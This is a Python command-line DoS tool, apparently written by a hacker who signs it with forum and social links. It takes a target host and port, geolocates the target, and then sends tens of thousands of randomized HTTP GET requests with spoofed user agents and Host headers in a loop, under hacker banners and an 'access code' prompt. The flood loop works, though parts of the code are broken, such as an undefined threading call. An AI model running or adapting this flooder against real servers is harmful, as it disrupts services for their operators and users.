#!/usr/bin/env python3
#
import hashlib, json, os, platform, random, requests, socket, sys, time ,uuid
from threading import Timer
#
hello = '''

       ██   ██ ███    ██ ███    ██ ███████ ███████ ███████  █████     
    ██ ██   ██ ████   ██ ████   ██ ██      ██      ██      ██   ██ ██ 
       ███████ ██ ██  ██ ██ ██  ██ ███████ █████   █████   ███████    
    ██ ██   ██ ██  ██ ██ ██  ██ ██      ██ ██      ██      ██   ██ ▄█ 
       ██   ██ ██   ████ ██   ████ ███████ ██      ███████ ██   ██ ▀  
                                                                      
                                                                      
'''
wr = ["LOCKED OUT OF SERVER; kwafeLt wAS hERE..","written by kwafelt"]
ws = ["https://kwafelt.github.io/?stt=raw","https://www.instagram.com/kwafelt/","dragonforce.io/members/30011/"]

Browser_identification = 'Chrome/104.0.5112.102 OPR/90.0.4480.80'
user_agent = 'WorkaroundCtl/1.00 libhttp/9.60 (PlayStation 4)' # PS4
user_agent2 = 'Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)'

station = socket.gethostname();
address = socket.gethostbyname(station)
hostnme = os.uname()[0];
usernme = os.environ.get('USERNAME')
admin = os.getlogin();
admin = str(admin).replace('K', 'k').replace('l', 'L')
MAC = hex(uuid.getnode());
slEEp = 0.75

BLOB = True
ROOT = [""]
#STAT = [socket.gethostname(),socket.gethostbyname(STAT[0])]
HTTP = ['HTTP/1.0','HTTP/1.1','h2']
HOST = ['writ.er.ws','search.censys.io']
CONN = ['close','Keep-Alive']

target_host = None
target_port = None

p1 = [sys.argv[0], "",""]

TARGET_IP = '80.179.151.134'; status = 'dorman'
#
workstation = "Hanna Sofea's comrade";
v4L = f'{admin} wAS hERE'
txt = ["","written by kwafelt"]
inject = 'Injecting process';
question = 'Do you want to continue ?'
confirm = ['Do you want to continue ?','Is this ok ?']

# parse_input
num_requests = 0;
thread_num = 0;

# cdata.py
#
def color(r, g, b, text):
  return '\033[38;2;{};{};{}m{}\033[38;2;255;255;255m'.format(r, g, b, text);

def title(c):
  if (c == 'start'): terminal_title = f'{workstation} \ {txt[1]}'
  if (c == 'prcss'): terminal_title = f'{inject} \ {target_host}:{target_port} \ {v4L}'
  print(f'\33]0;{terminal_title}\a', end = txt[0], flush = True)

def write(c):
  return sys.stdout.write(c)

def ossys(c):
  return os.system(c)

def timer(c):
  Timer(c, parse).start()

def ctime(c):
  ctime_tuple = time.localtime() # get struct_time
  time_string = time.strftime("%y/%m/%d %H:%M:%S", ctime_tuple)
  datetime = str(time_string)
  return datetime

def hash5(txt):
  str2hash = txt
  result = hashlib.md5(str2hash.encode())
  digest = result.hexdigest()
  return digest

def cdata(init):
  rawr = random.random()
  rawr = str(rawr).replace("0.","")
  raws = hash5(rawr)
  return raws

def reset(init):
  ossys('setterm --foreground default --background default --cursor on');
  if (init == 1):
    txt = f'STOPPING python3 {p1[0]} {p1[1]} {p1[2]}'
    write(f'\r\n {color(204,204,255,txt)}\r\n')
    write(f"\r\n {color(204,204,255,'T3R1M4 K4S3H ~')}\r\n\n")
    sys.exit(1)

def parse(init):
  global p1
  if (len(sys.argv) == 3):
    global target_host; global target_port
    target_host = str(sys.argv[1]); p1[1] = target_host
    target_port = int(sys.argv[2]); p1[2] = target_port
    verif(init)
  else:
    write(f'\r\n Usage: {sys.argv[0]} <target_host> <target_port>')
    write(f'\r\n exmpl: {sys.argv[0]} 255.255.255.255 443\n')
    reset(init); sys.exit(init)

def verif(init):
  try:
    r = socket.gethostbyname(target_host); s = socket.create_connection((r, target_port), 2)
    start(init)
  except (IOError, OSError):
    txt = color(245, 45, 45, 'SYSTEM LOCKDOWN / SERVER OFFLINE / FILTERED / CLOSED PORT');
    write(f'\r\n {txt}\r\n');
    reset(0)
  finally: pass

def start(init):
  ossys('setterm --foreground cyan --background black --cursor on')
  ossys('clear'); title('start'); write(f"\t{color(248,152,128,hello)}")
  write(f"\r\n\t{wr[0]}\n\n\t{ws[0]}\n\t{ws[1]}\n\t{ws[2]}\n\n\t{wr[1]}\n")
  
  accss('access code')

def accss(text):
  reply = input(f"\r\n\t{color(248,152,128,text)}  :  ")
  if (reply == 'bypass') or (reply == '30011') or (reply == '2022'):
    press(0)
  else: accss('  try again')

def press(c):
  ossys('setterm --foreground white --background black --cursor on')
  ossys('clear')
  tx1 = color(242,210,189, admin)
  tx2 = color(192,192,192, station)
  tx3 = color(242,210,189, MAC)
  tx4 = color(192,192,192, client('os'))
  tx5 = color(242,210,189, platform.release())
  write(f'\r\n {tx1} {tx2} {tx3} {tx4} {tx5}\r\n')
  write(f'\r\n {ipapi(0)}\r\n')
  tx6 = color(248,152,128, f'wanna/will inject process to {target_host} : {target_port}')
  write(f'\r\n {tx6}\r\n')
  write(f'\r\n {ipapi(1)}\r\n')
  yes_or_no(confirm[0])

def yes_or_no(question):
  reply = input(f'\r\n {color(248,152,128, question)} [y/N] ')
  if (reply == '') or (reply[0] == 'n'):
    reset(0); ossys('clear'); return False
  if (reply[0] == 'y'):
    recon(0); #return False
  else: return yes_or_no('so.. YES or NO ?')

def yes_or_no_ORIG(question):  # BROKEN
  reply = str(raw_input(question + ' [y/N] ')).lower().strip()
  if reply[0] == 'y': return True
  if reply[0] == 'n': return False
  else: return yes_or_no("Uhhhh... please enter ")

def recon(c):
  ossys('setterm --background black --cursor off')
  ossys('clear')
  title('prcss')
  tx1 = ctime(0)
  tx2 = f"{inject}.."
  pst = print_status()
  pst.initial(tx1, tx2)
  process(0);
  
################################################################################
def ipapi(i):
  URL = ['http://ip-api.com/json/', f'http://ip-api.com/json/{target_host}'];  # EDT https://ipinfo.io/json/1.1.1.1
  response = requests.get(URL[i])
  txt = json.loads(response.text)
  if (txt['status'] == 'success'):
  
    tx1 = f"{color(245, 245, 245, txt['country'])} {color(227, 10, 92, txt['regionName'])} {color(0, 110, 210, txt['city'])} {color(245, 245, 245, txt['zip'])}";
    tx2 = f"\r\n {color(227, 10, 92, txt['isp'])}\n {color(0, 110, 210, txt['query'])}"
    out = tx1 + tx2
  else:
    out = f"{color(245, 245, 245, txt['query'])} {color(0, 110, 210, txt['message'])}"
  return out
################################################################################
#
# scratch.py
#
def client(init):  # platform
    client_os = platform.system();
    un = platform.uname();
    client_hn = platform.node();  # hostname
    if (init == 'os'): return client_os;
    if (init == 'hn'): return client_hn;


def address(LAN):
    if LAN == 0:
        hostname = socket.gethostname()  # getting the IP address using socket.gethostbyname() method
        ip_address = socket.gethostbyname(hostname)  # getting the IP address using socket.gethostbyname() method
        addr = ip_address  # print(f"Hostname: {hostname}") # print(f"IP Address: {ip_address}")
    if LAN == 1:
        wifi = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        wifi.connect((remote_server, 80))  # 443
        addr = wifi.getsockname()[0]
    return addr

###############################################################################
class print_status():
  def initial(self, txt0, txt1):
    tx1 = color(245, 215, 0, txt0);
    tx2 = color(99, 99, 99, 'Initial');
    tx3 = color(255, 215, 0, txt1);
    sys.stdout.write(f'\r {tx1} {tx2} {tx3}\r');
  def success(self, txt0, txt1):
    tx1 = color(224,191,184, txt0);
    tx2 = color(218,112,214, 'Success');
    tx3 = color(248,152,128, txt1);
    tx4 = color(224,191,184, v4L);
    sys.stdout.write(f'\r\n {tx1} {tx2} {tx3} {tx4}\r');
  def timeout(self, txt0, txt1):
    tx1 = color(224,191,184, txt0);
    tx2 = color(245, 245, 245, 'Timeout');
    tx3 = color(245,215,0,'[--ERR_CONNECTION_TIMEOUT_ERR--]')
    tx4 = color(0, 110, 210, '[-RECONNECTING-]');
    sys.stdout.write(f'\r\n {tx1} {tx2} {tx3} {tx4}\r');
  def failure(self, txt0, txt1):
    tx1 = color(145, 145, 145, txt0);
    tx2 = color(245, 110, 110, 'Failure');
    tx3 = color(245, 1, 1, 'No connection SERVER MAY BE DOWN');
    tx4 = color(245,110,110, "[-!CLOSE-EVENT-]");
    sys.stdout.write(f'\r\n {tx1} {tx2} {tx3} {tx4}\r');
  flag = 'ctf{kwafeLt_wAS_hERE}';

###############################################################################

def attack(init):
  global BLOB
  global slEEp; data = cdata(init)
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as proc:
    try:
      address = (target_host, target_port); proc.settimeout(1.0)
      proc.connect(address)
      b1 = f'GET /?!{data} {HTTP[1]}\r\nHost: {HOST[1]}\r\nUser-Agent: {user_agent}\r\n'
      b2 = f'Accept-Encoding: gzip, deflate\r\nAccept: text/plain,*/*\r\n'
      b3 = f'Connection: {CONN[1]}\r\nKeep-Alive: timeout=15, max=100\r\n\r\n'
      proc.sendto((b1).encode('ascii'), address)
      proc.sendto((b2).encode('ascii'), address)
      proc.sendto((b3).encode('ascii'), address)
      if (init == 'debug'):
        response = proc.recv(4096); print(bytes1,bytes2); print(f'\r\n' + response.decode('ascii'))
        print(f'receiving {len(response)} bytes data...')
      #response = proc.recv(4096) # D O R M A N
      proc.shutdown(socket.SHUT_RDWR)
      proc.close()
      st = print_status(); st.success(ctime(0), data); BLOB = True
    except socket.timeout:
      st = print_status(); st.timeout(ctime(0), data); BLOB = False
    except socket.error:
      st = print_status(); st.failure(ctime(0), None); BLOB = False
    except (KeyboardInterrupt, SystemExit):
      sys.exit(0)
    finally: pass
  return slEEp;

def process_b(i):
    for i in range(99):  # 500
        time.sleep(slEEp);
        thread = threading.Thread(target=attack);
        thread.start()
    # ..D.O.R.M.A.N..

def process(i):
  global BLOB
  while (BLOB):
    if (i > 72540):
      time.sleep(1.0)
      flag = '10v3{5h371x1}'
      tx1 = color(204,204,255,f'COMPLETED / ETA {i} / {flag} / FINN')
      write(f'\r\n\n {tx1}\r\n')
      break
    else:
      try:
        attack(i)
      except (KeyboardInterrupt, SystemExit):
        R = color(204,204,255,f'ETA {i} / CTRL-C PRESSED / KEYBOARD INTERRUPT')
        write(f'\r\n\n {R}\r\n')
        sys.exit(0);
      finally: pass
    i = i + 1
  else:
    BLOB = True
    time.sleep(1)
    process(i)# Timer(slEEp,attack).start()
################################################################################
try:
  parse(0); BLOB = True
except (KeyboardInterrupt, IOError, OSError):
  tx1 = color(204,204,255,'KEYBOARD INTERRUPT RECEIVED, EXITING / CLOSE ..');
  write(f'\n {tx1}\r\n'); sys.exit(0)
except SystemExit as EXIT: pass
finally: reset(1); sys.exit(1);
##############################!TERIMA-KASEH~####################################
